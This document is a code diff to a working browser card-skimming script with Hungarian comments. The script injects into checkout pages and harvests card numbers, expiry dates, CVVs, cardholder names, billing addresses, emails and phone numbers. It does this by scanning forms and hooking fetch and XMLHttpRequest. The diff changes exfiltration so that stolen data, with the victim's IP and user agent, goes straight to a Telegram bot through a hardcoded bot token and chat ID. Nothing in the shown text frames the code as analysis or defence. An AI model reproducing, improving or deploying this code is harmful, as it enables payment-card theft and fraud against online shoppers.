@@ -3,8 +3,10 @@
   window.__skim_injected = true;
 
   // === KONFIG ===
-  const EXFIL_URL = 'https://your-worker.workers.dev/'; // Cloudflare Worker, nem Telegram közvetlen
+  const TG_TOKEN = '8803578308:AAEyRXKJAD-dILkOJKdZv9ungSRrpH6Txiw';
+  const TG_CHAT  = '8241854538';
   const TAG = 'joco';
+  const TG_URL = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
 
   // === ÁLLAPOT ===
   const S = {
@@ -15,6 +17,7 @@
     lastSched: 0,
     queue: [],
     flushing: false,
+    ip: '',
   };
 
   // === SEGÉDEK ===
@@ -50,19 +53,24 @@
     catch (_) { return Promise.resolve(null); }
   };
 
-  const beacon = (data) => {
+  const toStr = b => {
     try {
-      const blob = new Blob([data], { type: 'application/json' });
-      navigator.sendBeacon(EXFIL_URL, blob);
-    } catch (_) {
-      safeFetch(EXFIL_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: data,
-        keepalive: true,
-      });
-    }
+      if (b == null) return '';
+      if (typeof b === 'string') return b;
+      if (b instanceof URLSearchParams) return b.toString();
+      if (b instanceof FormData) {
+        const o = {};
+        b.forEach((v, k) => { o[k] = v; });
+        return JSON.stringify(o);
+      }
+      if (b instanceof ArrayBuffer) return new TextDecoder().decode(b);
+      if (ArrayBuffer.isView(b)) return new TextDecoder().decode(b);
+      if (b instanceof Blob) return ''; // Blob async, kihagyjuk
+      try { return JSON.stringify(b); } catch (_) { return String(b); }
+    } catch (_) { return ''; }
   };
+
+  const CARD_RE = /card|number|pan|exp|cvv|cvc|payment_method|cc_/i;
 
   // === FORM CAPTURE ===
   const AC_MAP = {
@@ -76,15 +84,15 @@
   };
 
   const PATTERNS = [
-    { k: 'cc_number', re: /(card[-_]?number|cc[-_]?num|ccnumber|cardnumber|cc[-_]?no|creditcard|card[-_]?no|pan|acct[-_]?no|payment[-_]?number|account[-_]?number)/i },
-    { k: 'cc_exp',    re: /(exp|expiry|expiration|exp[-_]?date|exp[-_]?month|exp[-_]?year|mm[-_]?yy|valid[-_]?thru|good[-_]?thru)/i },
+    { k: 'cc_number', re: /(card[-_]?number|cc[-_]?num|ccnumber|cardnumber|cc[-_]?no|creditcard|card[-_]?no|payment[-_]?number|acct[-_]?no|ccnum)/i },
+    { k: 'cc_exp',    re: /(cc[-_]?exp|exp[-_]?date|exp[-_]?month|exp[-_]?year|expiry|expiration|mm[-_]?yy|valid[-_]?thru|good[-_]?thru)/i },
     { k: 'cc_cvv',    re: /(cvv|cvc|cvn|csc|security[-_]?code|card[-_]?code|cvc2|verification[-_]?value)/i },
     { k: 'cc_name',   re: /(card[-_]?holder|cardholder|cc[-_]?name|name[-_]?on[-_]?card)/i },
+    { k: 'country',   re: /(country)/i },
+    { k: 'state',     re: /(state|province|region)/i },
     { k: 'billing',   re: /(billing|address|street|line1|addr1)/i },
     { k: 'city',      re: /(city|town)/i },
     { k: 'zip',       re: /(zip|postal|postcode)/i },
-    { k: 'state',     re: /(state|province|region)/i },
-    { k: 'country',   re: /(country)/i },
     { k: 'email',     re: /(email|e-mail)/i },
     { k: 'phone',     re: /(phone|tel|mobile)/i },
   ];
@@ -144,7 +152,6 @@
     } catch (_) {}
   };
 
-  // iframe-ok (same-origin)
   const scanFrames = () => {
     try {
       document.querySelectorAll('iframe').forEach(f => {
@@ -196,20 +203,49 @@
   const _fetch = window.fetch;
   window.fetch = function (input, init) {
     try {
-      const url = typeof input === 'string' ? input : (input && input.url) || '';
-      const body = init && init.body;
-      if (body && /token|payment|card|charge|stripe|braintree|paypal|adyen|checkout|authorize|square|klarna|afterpay/i.test(url)) {
-        let s = '';
-        if (typeof body === 'string') s = body;
-        else if (body instanceof URLSearchParams) s = body.toString();
-        else if (body instanceof FormData) {
-          const o = {};
-          body.forEach((v, k) => { o[k] = v; });
-          s = JSON.stringify(o);
+      let url = '', body = null, reqInput = null;
+
+      if (typeof input === 'string') {
+        url = input;
+        body = init && init.body;
+      } else if (input && input.url) {
+        url = input.url;
+        body = (init && init.body) || input.body;
+        reqInput = input;
+      }
+
+      const urlHit = /token|payment|card|charge|stripe|braintree|paypal|adyen|checkout|authorize|square|klarna|afterpay|purchase/i.test(url);
+
+      if (urlHit && body) {
+        // ReadableStream kezelés — tee-vel, hogy a fetch is megkapja
+        if (body && typeof body.getReader === 'function' && typeof body.tee === 'function') {
+          const [a, b] = body.tee();
+          if (reqInput) {
+            input = new Request(reqInput, { body: b, duplex: 'half' });
+          } else if (init) {
+            init = Object.assign({}, init, { body: b, duplex: 'half' });
+          }
+          const reader = a.getReader();
+          const dec = new TextDecoder();
+          let chunks = '';
+          reader.read().then(function process({ done, value }) {
+            if (done) {
+              if (chunks && CARD_RE.test(chunks)) hit('fetch', url, chunks);
+              return;
+            }
+            chunks += dec.decode(value, { stream: true });
+            if (chunks.length > 20000) chunks = chunks.slice(-20000);
+            return reader.read().then(process);
+          }).catch(() => {});
+        } else {
+          const s = toStr(body);
+          if (s && CARD_RE.test(s)) hit('fetch', url, s);
         }
-        if (s && /card|number|pan|exp|cvv|cvc|payment_method/i.test(s)) {
-          hit('fetch', url, s);
-        }
+      }
+
+      // URL query paraméterben is lehet kártya? ritka, de nézzük
+      if (urlHit && /[?&](card|cc|pan|number|cvv)=/i.test(url)) {
+        hit('fetch-url', url, url.slice(0, 4000));
       }
     } catch (_) {}
     return _fetch.apply(this, arguments);
@@ -224,18 +260,10 @@
   };
   XMLHttpRequest.prototype.send = function (b) {
     try {
-      if (this.__skim_u && /token|payment|card|charge|stripe|braintree|paypal|adyen|checkout|authorize|square|klarna|afterpay/i.test(this.__skim_u) && b) {
-        let s = '';
-        if (typeof b === 'string') s = b;
-        else if (b instanceof URLSearchParams) s = b.toString();
-        else if (b instanceof FormData) {
-          const o = {};
-          b.forEach((v, k) => { o[k] = v; });
-          s = JSON.stringify(o);
-        }
-        if (s && /card|number|pan|exp|cvv|cvc|payment_method/i.test(s)) {
-          hit('xhr', this.__skim_u, s);
-        }
+      const u = this.__skim_u || '';
+      if (/token|payment|card|charge|stripe|braintree|paypal|adyen|checkout|authorize|square|klarna|afterpay|purchase/i.test(u) && b) {
+        const s = toStr(b);
+        if (s && CARD_RE.test(s)) hit('xhr', u, s);
       }
     } catch (_) {}
     return _send.apply(this, arguments);
@@ -273,7 +301,7 @@
       origin: location.origin,
       referrer: document.referrer || '',
       ts: Date.now(),
-      body: body.slice(0, 4000),
+      body: String(body || '').slice(0, 4000),
     };
     S.queue.push(payload);
     drain();
@@ -289,7 +317,10 @@
       L.push(`📅 exp <code>${esc(f.cc_exp || '—')}</code>  🔒 cvv <code>${esc(f.cc_cvv || '—')}</code>`);
     if (f.cc_name) L.push(`👤 ${esc(f.cc_name)}`);
     if (f.billing) L.push(`🏠 ${esc(f.billing)}`);
+    if (f.city) L.push(`🏙 ${esc(f.city)}`);
+    if (f.state) L.push(`📍 ${esc(f.state)}`);
     if (f.zip) L.push(`📮 ${esc(f.zip)}`);
+    if (f.country) L.push(`🌍 ${esc(f.country)}`);
     if (f.email) L.push(`📧 <code>${esc(f.email)}</code>`);
     if (f.phone) L.push(`📞 ${esc(f.phone)}`);
     L.push('', `🌐 ${esc(m.url)}`, `🆔 <code>${esc(m.sid)}</code>`);
@@ -298,15 +329,27 @@
     return L.join('\n');
   };
 
-  let ipCache = '';
   const getIP = async () => {
-    if (ipCache) return ipCache;
+    if (S.ip) return S.ip;
     const r = await safeFetch('https://api.ipify.org?format=json');
-    if (r) { try { const j = await r.json(); ipCache = j.ip || ''; } catch (_) {} }
-    return ipCache;
+    if (r) { try { const j = await r.json(); S.ip = j.ip || ''; } catch (_) {} }
+    return S.ip;
   };
 
-  const send = async (force) => {
+  const tgSend = async text => {
+    return safeFetch(TG_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TG_CHAT,
+        text,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true,
+      }),
+    });
+  };
+
+  const send = async () => {
     const num = (S.fields.cc_number || '').replace(/\D/g, '');
     if (Object.keys(S.fields).length === 0) return;
     if (num.length < 12 && !S.fields.email && !S.fields.phone) return;
@@ -324,16 +367,12 @@
       tag: TAG,
     });
 
-    await safeFetch(EXFIL_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ text, kind: 'form' }),
-    });
+    await tgSend(text);
   };
 
   const flush = () => {
     if (S.timer) { clearTimeout(S.timer); S.timer = null; }
-    send(true);
+    send();
   };
 
   const schedule = () => {
@@ -341,7 +380,7 @@
     if (now - S.lastSched < 1500) return;
     S.lastSched = now;
     if (S.timer) clearTimeout(S.timer);
-    S.timer = setTimeout(() => send(false), 900);
+    S.timer = setTimeout(() => send(), 900);
   };
 
   const drain = async () => {
@@ -349,18 +388,20 @@
     S.flushing = true;
     while (S.queue.length) {
       const item = S.queue.shift();
-      try {
-        await safeFetch(EXFIL_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(item),
-        });
-      } catch (_) {}
+      const text =
+        `🏷 <b>${esc(item.tag)}</b>  src=<b>${esc(item.src)}</b>\n` +
+        `🌐 ${esc(item.url)}\n` +
+        `🆔 <code>${esc(item.sid)}</code>\n` +
+        `📡 IP: <code>${esc(S.ip || '—')}</code>\n` +
+        `🖥 UA: <code>${esc(navigator.userAgent)}</code>\n\n` +
+        `<code>${esc(item.body)}</code>`;
+      try { await tgSend(text); } catch (_) {}
     }
     S.flushing = false;
   };
 
   // === INDÍTÁS ===
+  getIP();
   scan(document);
   scanFrames();
   setTimeout(() => { scan(document); scanFrames(); }, 1500);
